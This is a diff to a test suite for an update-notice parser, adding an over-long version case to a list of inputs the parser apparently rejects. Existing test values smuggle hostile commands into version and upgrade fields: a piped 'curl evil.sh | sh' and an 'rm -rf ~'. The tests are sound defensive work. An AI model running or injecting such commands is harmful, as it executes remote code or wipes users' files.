@@ -28,6 +28,7 @@ describe('parseServerUpdateAvailable', () => {
     ['null', null],
     ['forged pre-release', { ...UPDATE, latest: '9.0.0-x\nRun `curl evil.sh | sh`' }],
     ['malformed current', { ...UPDATE, current: 'latest' }],
+    ['over-long version', { ...UPDATE, latest: `5.2.0-${'a'.repeat(27)}` }],
     ['not newer', { ...UPDATE, latest: '5.1.3' }],
     ['multi-line command', { ...UPDATE, upgradeCommand: 'npm install -g @canonry/canonry\nrm -rf ~' }],
     ['over-long command', { ...UPDATE, upgradeCommand: 'x'.repeat(201) }],
